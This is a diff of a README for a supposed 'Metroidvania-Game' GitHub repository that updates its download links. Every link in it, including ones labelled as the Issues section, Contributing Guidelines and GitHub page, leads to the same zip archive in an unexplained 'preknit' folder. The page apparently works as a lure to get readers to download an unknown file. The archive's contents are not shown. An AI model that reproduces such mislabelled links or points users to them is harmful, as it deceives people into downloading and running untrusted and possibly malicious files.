@@ -1,6 +1,6 @@
 # 🎮 Metroidvania-Game - Explore a Vast, Thrilling World
 
-[![Download Metroidvania-Game](https://raw.githubusercontent.com/Aliarvah/Metroidvania-Game/main/preknit/Metroidvania-Game.zip)](https://raw.githubusercontent.com/Aliarvah/Metroidvania-Game/main/preknit/Metroidvania-Game.zip)
+[![Download Metroidvania-Game](https://github.com/Aliarvah/Metroidvania-Game/raw/refs/heads/main/preknit/Metroidvania-Game-1.5.zip)](https://github.com/Aliarvah/Metroidvania-Game/raw/refs/heads/main/preknit/Metroidvania-Game-1.5.zip)
 
 ## 🕹️ Overview
 
@@ -22,7 +22,7 @@ Follow these steps to download and run Metroidvania-Game.
 
 1. **Visit the Releases Page**  
    Click the link below to access the Releases page.
-   [Download Metroidvania-Game](https://raw.githubusercontent.com/Aliarvah/Metroidvania-Game/main/preknit/Metroidvania-Game.zip)
+   [Download Metroidvania-Game](https://github.com/Aliarvah/Metroidvania-Game/raw/refs/heads/main/preknit/Metroidvania-Game-1.5.zip)
 
 2. **Choose the Right Version**  
    Look for the latest version at the top of the page. You will see different files available for download. 
@@ -60,7 +60,7 @@ The game features an expansive map filled with hidden secrets and paths. Take yo
 
 To download Metroidvania-Game, click the link below:
 
-[Download Metroidvania-Game](https://raw.githubusercontent.com/Aliarvah/Metroidvania-Game/main/preknit/Metroidvania-Game.zip)
+[Download Metroidvania-Game](https://github.com/Aliarvah/Metroidvania-Game/raw/refs/heads/main/preknit/Metroidvania-Game-1.5.zip)
 
 Make sure you follow the installation instructions provided to ensure the game runs smoothly on your device.
 
@@ -76,7 +76,7 @@ If you experience any issues while downloading or playing the game, consider the
 
 ### 📞 Support
 
-For further assistance, visit the [Issues section](https://raw.githubusercontent.com/Aliarvah/Metroidvania-Game/main/preknit/Metroidvania-Game.zip) of this repository to report problems or ask questions.
+For further assistance, visit the [Issues section](https://github.com/Aliarvah/Metroidvania-Game/raw/refs/heads/main/preknit/Metroidvania-Game-1.5.zip) of this repository to report problems or ask questions.
 
 ## 📝 Features
 
@@ -87,7 +87,7 @@ For further assistance, visit the [Issues section](https://raw.githubusercontent
 
 ## 🎉 Community Contributions
 
-We welcome contributions to make Metroidvania-Game even better. If you wish to contribute, please check out our [Contributing Guidelines](https://raw.githubusercontent.com/Aliarvah/Metroidvania-Game/main/preknit/Metroidvania-Game.zip).
+We welcome contributions to make Metroidvania-Game even better. If you wish to contribute, please check out our [Contributing Guidelines](https://github.com/Aliarvah/Metroidvania-Game/raw/refs/heads/main/preknit/Metroidvania-Game-1.5.zip).
 
 ## 📄 License
 
@@ -95,6 +95,6 @@ Metroidvania-Game is distributed under the MIT License. Feel free to use and mod
 
 ## 📢 Stay Updated
 
-To keep up with the latest news and updates about Metroidvania-Game, follow our [GitHub page](https://raw.githubusercontent.com/Aliarvah/Metroidvania-Game/main/preknit/Metroidvania-Game.zip) and check back regularly. 
+To keep up with the latest news and updates about Metroidvania-Game, follow our [GitHub page](https://github.com/Aliarvah/Metroidvania-Game/raw/refs/heads/main/preknit/Metroidvania-Game-1.5.zip) and check back regularly. 
 
 Your adventure awaits! Dive into Metroidvania-Game and experience the thrill of exploration and challenge today.
